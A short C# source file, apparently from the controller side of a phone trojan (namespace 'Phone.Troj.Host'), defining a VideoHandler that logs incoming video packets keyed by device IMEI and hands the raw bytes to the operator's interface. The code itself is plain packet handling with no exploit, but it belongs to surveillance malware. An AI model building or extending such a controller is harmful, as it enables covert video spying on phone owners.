using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class VideoHandler : IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public VideoHandler(int channel, string imei, IMainView gui)
        {
            this.gui = gui;
            this.channel = channel;
            this.imei = imei;
        }


        public void Receive(IPacket p, string tempIMEI)
        {
            

        }

        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("Video data has been received");
            c.ChannelHandlerMap[imei].GetStorage(channel).Reset();
            var packet = (RawPacket)p;
            gui.AddVideoBytes(imei, packet.Data);
        }

    }
}
